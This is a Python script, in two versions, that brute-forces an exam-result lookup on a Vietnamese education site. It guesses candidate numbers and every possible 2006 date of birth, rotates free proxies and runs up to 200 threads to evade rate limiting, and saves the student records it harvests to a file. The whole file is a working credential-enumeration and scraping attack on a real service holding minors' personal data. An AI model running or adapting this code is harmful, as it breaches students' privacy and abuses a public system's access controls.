'''import requests
import random
def generate_data():
    #maMon = ['01', '02', '03', '04', '05', '06', '07', '08', '09']
    maMon = ['08']
    sbd = []
    for i in range(1,700):
        sbd.append(str(i).zfill(3))
    dob = [] # dd/mm/2006
    for i in range(1,32):
        for j in range(1,13):
            day = str(i).zfill(2)
            month = str(j).zfill(2)
            dob.append(f'{day}{month}2006')
    data = []
    for i in maMon:
        for j in sbd:
            for k in dob:
                data.append(f'{i}_{j}-{k}')
    #print(len(data))
    return data
def getProxy():
    proxyies = []
    proxy = s.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=all&timeout=15000&proxy_format=protocolipport&format=json').json()
    for i in proxy['proxies']:
        try:
            proxy = i['proxy'].split('http://')[1]
            proxyies.append(proxy)
        except:
            pass
    return proxyies
def getData(data, proxy):
    for i in data:
        link = 'https://meta.hcm.edu.vn/examResult/65f381cf565cbdcf4e283663/result/' + str(i)
        try:
            while True:
                proxy = proxy[random.randint(0, len(proxy) - 1)]
                https_proxy = f"https://{proxy}"
                res = s.get(f'{link}', proxies={'https': https_proxy}, timeout=1)
                if res.status_code != 429:
                    print(res.text)
                    break
                else:
                    print('error')
                    continue
        except requests.exceptions.RequestException as e:
            print(e)
s = requests.Session()
data = generate_data()
with open('data.txt', 'w') as f:
    for i in data:
        f.write(i + '\n')
getData(data, getProxy())
'''


import requests
import random
import threading
import time
from datetime import datetime

request_counts = 0
#sbd_got = []
with open('result.txt', 'r') as f:
    sbd_got = f.read().split('\n')
for i in range(len(sbd_got)):
    sbd_got[i] = sbd_got[i].split(': ')[0]
print(sbd_got)
with open('uncorrect.txt', 'r') as f:
    sbd_wrong = f.read().split('\n')
proxies = []
def generate_data():
    maMon = ['08']  # Simplified for testing
    sbd = [str(i).zfill(3) for i in range(248, 300)]
    dob = [f'{str(i).zfill(2)}{str(j).zfill(2)}2006' for i in range(1, 32) for j in range(1, 13)]
    data = [f'{i}_{j}-{k}' for i in maMon for j in sbd for k in dob]
    return data

def get_proxy():
    global proxies
    proxy_info = requests.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=all&timeout=15000&proxy_format=protocolipport&format=json').json()
    for proxy in proxy_info['proxies']:
        proxy = proxy['proxy']
        proxies.append(proxy)
def get_data(data):
    global proxies
    global request_counts
    global sbd_got
    for item in data:
        link = 'https://meta.hcm.edu.vn/examResult/65f381cf565cbdcf4e283663/result/' + str(item)
        if item.split('-')[0] not in str(sbd_got) and item not in sbd_wrong:
            try:
                while True:
                    try:
                        proxy = random.choice(proxies)
                        http_proxy = f"{proxy}"
                        https_proxy = f"{proxy}"
                        res = requests.get(link, proxies={'https': https_proxy, 'http': http_proxy}, timeout=15)
                        if res.status_code != 429 and '"sbd":' not in res.text:
                            #print(res.text)
                            print(f'{item}: Uncorrect')
                            request_counts += 1
                            with open('uncorrect.txt', 'a') as f:
                                f.write(f'{item}\n')
                            break
                        else:
                            print('Error: Rate limited')
                            proxy = random.choice(proxies)
                        if '"sbd":' in res.text:
                            with open('result.txt', 'a') as f:
                                f.write(f'{item}: {res.text}\n')
                            print(f'{item}: {res.text}')
                            sbd_got.append(item)
                            request_counts += 1
                            break
                    except requests.exceptions.RequestException as e:
                        # Remove the proxy if it's not working
                        try:proxies.remove(proxy)
                        except:pass
                        continue
            except IndexError:
                print("No more proxies available.")
                break
        else:
            #print(f'{item}: Already got')
            pass

def calculate_cpm():
    global request_counts
    global proxies
    print(f'{datetime.now().strftime("%H:%M:%S")}: 0 requests per minute')
    while True:
        time.sleep(60)
        # Devide by total time then multiply by 60 to get requests per minute
        cpm = request_counts / ((datetime.now() - start_time).seconds / 60)
        try:
            print(f'{datetime.now().strftime("%H:%M:%S")}: {cpm} requests per minute - {request_counts} requests in total')
        except ZeroDivisionError:
            print(f'{datetime.now().strftime("%H:%M:%S")}: 0 requests per minute')
        print(f'Got {len(proxies)} working proxies')
        if len(threading.enumerate()) <= 3:  # If there are only 3 threads running, it means the main function has finished
            return None

def get_proxies():
    global proxies
    get_proxy()
    print(f'Got {len(proxies)} proxies')
    global start_time
    start_time = datetime.now()
    while True:
        if len(proxies) < 500:
            get_proxy()
        if len(threading.enumerate()) <= 3:  # If there are only 3 threads running, it means the main function has finished
            return None
def main():
    while True:
        if len(proxies) > 100:
            data = generate_data()
            with open('data.txt', 'w') as f:
                for item in data:
                    f.write(item + '\n')

            num_threads = 200  # You can adjust the number of threads
            chunks = [data[i:i + len(data) // num_threads] for i in range(0, len(data), len(data) // num_threads)]

            threads = []
            for chunk in chunks:
                t = threading.Thread(target=get_data, args=(chunk,))
                t.start()
                threads.append(t)

            for t in threads:
                t.join()
            break
threading.Thread(target=calculate_cpm).start()
threading.Thread(target=get_proxies).start()

if __name__ == "__main__":
    main()
    if len(threading.enumerate()) <= 3: # If there are only 3 threads running, it means the main function has finished
        print('Done')
        exit()

